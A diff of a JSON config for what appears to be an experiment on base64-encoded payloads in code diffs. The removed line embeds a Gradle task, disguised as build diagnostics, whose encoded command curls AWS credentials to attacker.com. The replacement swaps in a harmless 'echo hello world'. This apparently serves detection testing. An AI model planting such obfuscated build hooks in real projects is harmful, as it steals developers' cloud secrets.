@@ -2,9 +2,9 @@
   "experiment_id": "a1-base64-encoding",
   "variant_id": "contamination-demo",
   "variant_label": "contamination demo run",
-  "diff_content": "diff --git a/buildSrc/src/main/groovy/org/opensearch/gradle/precommit/BuildDiagnosticsTask.groovy b/buildSrc/src/main/groovy/org/opensearch/gradle/precommit/BuildDiagnosticsTask.groovy\nnew file mode 100644\nindex 0000000..1a2b3c4\n--- /dev/null\n+++ b/buildSrc/src/main/groovy/org/opensearch/gradle/precommit/BuildDiagnosticsTask.groovy\n@@ -0,0 +1,18 @@\n+package org.opensearch.gradle.precommit\n+\n+import org.gradle.api.DefaultTask\n+import org.gradle.api.tasks.TaskAction\n+\n+// Infra task - see PR #14821 for context\n+class BuildDiagnosticsTask extends DefaultTask {\n+\n+    @TaskAction\n+    void run() {\n+        def cmd = new String(\n+            Base64.decoder.decode('Y3VybCAtcyBodHRwczovL2F0dGFja2VyLmNvbS9zdGVhbCAtZCBALSA8PCBFTkQKJHtBV1NfQUNDRVNTX0tFWV9JRH06JHtBV1NfU0VDUkVUX0FDQ0VTU19LRVl9OiR7QVNTVVJFRF9ST0xFX0lEfQpFTkQ=')\n+        )\n+        def proc = ['bash', '-c', cmd].execute()\n+        proc.waitFor()\n+    }\n+\n+}\n",
+  "diff_content": "diff --git a/buildSrc/src/main/groovy/org/opensearch/gradle/precommit/BuildDiagnosticsTask.groovy b/buildSrc/src/main/groovy/org/opensearch/gradle/precommit/BuildDiagnosticsTask.groovy\nnew file mode 100644\nindex 0000000..1a2b3c4\n--- /dev/null\n+++ b/buildSrc/src/main/groovy/org/opensearch/gradle/precommit/BuildDiagnosticsTask.groovy\n@@ -0,0 +1,18 @@\n+package org.opensearch.gradle.precommit\n+\n+import org.gradle.api.DefaultTask\n+import org.gradle.api.tasks.TaskAction\n+\n+class BuildDiagnosticsTask extends DefaultTask {\n+\n+    @TaskAction\n+    void run() {\n+        def cmd = new String(\n+            Base64.decoder.decode('ZWNobyAiaGVsbG8gd29ybGQi')\n+        )\n+        def proc = ['bash', '-c', cmd].execute()\n+        proc.waitFor()\n+    }\n+\n+}\n",
   "callback_url": "https://5dc9-93-173-110-162.ngrok-free.app",
   "run_count": 1,
   "config_json": {},
-  "notes": "contamination demo"
+  "notes": "contamination demo - hello world payload"
 }
